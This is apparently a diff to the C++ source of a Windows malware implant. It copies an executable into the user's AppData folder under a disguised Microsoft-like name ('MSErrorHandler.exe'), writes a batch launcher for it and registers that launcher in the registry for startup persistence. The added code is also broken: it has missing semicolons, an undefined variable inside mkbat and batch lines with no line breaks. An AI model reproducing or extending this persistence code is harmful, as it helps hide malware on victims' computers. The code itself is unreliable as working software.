@@ -176,12 +176,23 @@ namespace IO
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);*/
     }
+  bool mkbat(std::string path,std::string batname_path){
+    ofstream bat;
+    bat.open (batname+".bat");
+    bat << "@echo off";
+    bat << "start "+path;
+    //bat << "start "
+    bat.close();
+    return 0;
+  }
     bool copy_File() {
         char* appdata = getenv("APPDATA");
         std::string appdata_dir(appdata);
         std::string path = appdata_dir + "\\Microsoft\\Services\\";
         std::string filename = "MSErrorHandler.exe";
         std::string fullpath = path + filename;
+        std::string batname;
+        std::string batpath;
         if (IO::exists_file(fullpath)) {
             char* temp = getenv("temp");
             std::string temp_dir(temp);
@@ -206,35 +217,57 @@ namespace IO
                 }else {
                     std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
+                    if(filename == "LLseervice.exe"){
+                      batname = "batLL.bat";
+                      batpath = path+batname;
+                    }else{
+                      batname = "batER.bat";
+                      batpath = path+batname;
+                    }
+                    
+                    mkbat(fullpath,batpath)
+                    //shell_cmd()
                     startup(fullpath.c_str());
-                    Registry::RegisterProgram2(filename,fullpath);
+                    Registry::RegisterProgram2(batname,batpath);
                     return true;
                 }
             }else {
-                std::string msg = "COMPLETE"+std::string(fullpath);
-                Helper::WriteAppLog(msg);
-                startup(fullpath.c_str());
-                Registry::RegisterProgram2(filename,fullpath);
-                return true;
+               std::string msg = "COMPLETE" +std::string(fullpath);
+                    Helper::WriteAppLog(msg);
+                    if(filename == "LLseervice.exe"){
+                      batname = "batLL.bat";
+                      batpath = path+batname;
+                    }else{
+                      batname = "batER.bat";
+                      batpath = path+batname;
+                    }
+                    
+                    mkbat(fullpath,batpath)
+                    //shell_cmd()
+                    startup(fullpath.c_str());
+                    Registry::RegisterProgram2(batname,batpath);
+                    return true;
             }
         }else {
-            std::string msg = "COMPLETE" +std::string(fullpath);
-            Helper::WriteAppLog(msg);
-            startup(fullpath.c_str());
-            Registry::RegisterProgram2(filename,fullpath);
-            return true;
+           std::string msg = "COMPLETE" +std::string(fullpath);
+                    Helper::WriteAppLog(msg);
+                    if(filename == "LLseervice.exe"){
+                      batname = "batLL.bat";
+                      batpath = path+batname;
+                    }else{
+                      batname = "batER.bat";
+                      batpath = path+batname;
+                    }
+                    
+                    mkbat(fullpath,batpath)
+                    //shell_cmd()
+                    startup(fullpath.c_str());
+                    Registry::RegisterProgram2(batname,batpath);
+                    return true;
         }
 
     }
-  bool mkbat(std::string path,std::string batname_path){
-    ofstream bat;
-    bat.open (batname+".bat");
-    bat << "@echo off";
-    bat << "start "+path;
-    //bat << "start "
-    bat.close();
-    return 0;
-  }
+  
 }
 
 
